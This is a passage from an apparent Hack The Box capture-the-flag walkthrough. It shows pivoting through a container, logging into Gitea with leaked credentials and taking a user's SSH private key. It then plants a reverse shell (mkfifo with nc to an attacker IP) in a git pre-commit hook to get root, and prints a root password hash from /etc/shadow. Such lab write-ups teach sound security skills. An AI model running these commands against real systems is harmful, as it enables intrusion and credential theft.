[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:1 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:2 <--socket error or timeout!
<SNIP>
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK
<SNIP>
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:80  ...  OK
<SNIP>
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:3000  ...  OK
Open 172.17.0.1:22
Open 172.17.0.1:80
Open 172.17.0.1:3000
```

That's proved we can get to those ports from Kali via Chisel, through the container on IP 172.17.0.5 and across to the internal IP of the box on 172.17.0.1.

## Gitea

Let's have a look at Gitea on port 3000. First set a Proxy on FireFox, I use [FoxyProxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/):

![opensource-socks-proxy](/assets/images/2022-06-08-23-12-55.png)

Now we can browse to the website:

![opensource-gitea](/assets/images/2022-06-08-23-13-48.png)

I played around a little, created my own login, etc, but to proceed we need to use those credentials we found earlier in the git commit:

```text
dev01:Soulless_Developer#2022
```

Log in with them:

![opensource-gitea-login](/assets/images/2022-06-08-23-14-55.png)

The dashboard shows us the last few things the user did:

![opensource-dev01-home](/assets/images/2022-06-08-23-15-31.png)

That repo called home-backup sounds suspicious so let's have a look:

![opensource-dev01-backup](/assets/images/2022-06-08-23-16-00.png)

It's the users /home folder, let's look in .ssh:

![opensource-dev01-ssh](/assets/images/2022-06-08-23-16-24.png)

We have their ssh keys, let's copy the id_rsa file containing the private key:

![opensource-dev01-id_rsa](/assets/images/2022-06-08-23-18-29.png)

Paste it in to a file on Kali and change permissions:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
7FU4L6ihII7zNEjaM1/d7xJ/0M88NhS1X4szT6txiB6oBMQGGolDlDJXpe<SNIP>

┌──(root㉿kali)-[~/htb/opensource]
└─# chmod 600 id_rsa    
```

## SSH As User dev01

Now we can ssh in as the dev01 user:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# ssh -i id_rsa dev01@10.10.11.164
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

  System information as of Wed Jun  8 22:19:55 UTC 2022

  System load:  0.0               Processes:              279
  Usage of /:   75.4% of 3.48GB   Users logged in:        1
  Memory usage: 38%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1

Last login: Wed Jun  8 22:11:09 2022 from 10.10.14.112
dev01@opensource:~$ 
```

Let's grab the user flag before we move on:

```sh
dev01@opensource:~$ cat user.txt 
d9369780ee9ac6d706603da08e0dc7d9
```

## Escalation To Root

Escalation to root is actually pretty simple. I did a bit of enumeration but nothing obvious stood out. Usually next things I try is look at running processes, sudo rights, and then pull LinPEAS over for a more detailed look. On this box it was processes that was the correct path.

## Pspy64

On Kali grab [pspy64](https://github.com/DominicBreuker/pspy) and start a web server so we can get to it:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64                 
--2022-06-09 22:31:56--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220609%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220609T213156Z&X-Amz-Expires=300&X-Amz-Signature=27a79850c7226b0a9dab56aa96afed89248b262414bbc6415acbab911b52fa0d&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64          100%[====================================>]   2.94M  18.2MB/s    in 0.2s    
2022-06-09 22:31:56 (18.2 MB/s) - ‘pspy64’ saved [3078592/3078592]

┌──(root㉿kali)-[~/htb/opensource]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Back over to our ssh session on the box, pull pspy over:

```text
dev01@opensource:~/.git/hooks$ cd /dev/shm
dev01@opensource:/dev/shm$ wget http://10.10.14.184:8000/pspy64
--2022-06-09 21:32:37--  http://10.10.14.184:8000/pspy64
Connecting to 10.10.14.184:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64            100%[===================>]   2.94M  2.25MB/s    in 1.3s    
2022-06-09 21:32:38 (2.25 MB/s) - ‘pspy64’ saved [3078592/3078592]
```

Make it executable and then start it watching:

```text
dev01@opensource:/dev/shm$ chmod +x pspy64
dev01@opensource:/dev/shm$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...done
2022/06/09 21:33:26 CMD: UID=0    PID=96     | 
2022/06/09 21:33:26 CMD: UID=0    PID=922    | /usr/bin/vmtoolsd 
2022/06/09 21:33:26 CMD: UID=0    PID=920    | /usr/bin/VGAuthService 
2022/06/09 21:33:26 CMD: UID=0    PID=90     | 
2022/06/09 21:33:26 CMD: UID=0    PID=9      | 
<SNIP>
2022/06/09 21:34:01 CMD: UID=0    PID=12735  | /bin/bash /usr/local/bin/git-sync 
2022/06/09 21:34:01 CMD: UID=0    PID=12742  | git add . 
2022/06/09 21:34:01 CMD: UID=0    PID=12743  | git commit -m Backup for 2022-06-09 
2022/06/09 21:34:01 CMD: UID=0    PID=12745  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/06/09 21:34:01 CMD: UID=0    PID=12744  | git push origin main 
<SNIP>
2022/06/09 21:35:01 CMD: UID=0    PID=13378  | git add . 
2022/06/09 21:35:01 CMD: UID=0    PID=13379  | git commit -m Backup for 2022-06-09 
2022/06/09 21:35:01 CMD: UID=0    PID=13380  | git push origin main 
2022/06/09 21:35:01 CMD: UID=0    PID=13381  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
```

## Exploiting Git Commit

Amongst the output we can see above there is a **git commit** running every minute. For CTF something like this is always suspicious, but I didn't know of a way to exploit. A quick look around found [this](https://www.atlassian.com/git/tutorials/git-hooks) good article from Atlassian which explains how we can use hooks to get code execution.

With the **git commit** being run regularly we can use the pre-commit file to execute commands before the commit is done. So it's nice and simple to get a reverse shell, we just put the one we used earlier in to a file called pre-commit in the dev01 users .git/hooks folder:

```text
dev01@opensource:~/.git/hooks$ echo '#!/bin/bash
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.184 1337 >/tmp/f' > /home/dev01/.git/hooks/pre-commit

dev01@opensource:~/.git/hooks$ chmod +x /home/dev01/.git/hooks/pre-commit
```

Now when the cron job running as root executes the **git commit** our pre-commit file is also executed as root. Switch to a waiting nc listener and within a minute we have our root shell connected:

```text
┌──(root㉿kali)-[~/htb/opensource]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.184] from (UNKNOWN) [10.10.11.164] 49284
root@opensource:/home/dev01#
```

We've made it to root, let's grab the flag and we've completed another box:

```text
root@opensource:/home/dev01# cat root.txt
afaeaf858c16b8ae9f6979629702652e

root@opensource:~# cat /etc/shadow | grep root
root:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::
```

All done. I hope this walkthrough helped you learn a thing or two. See you next time.
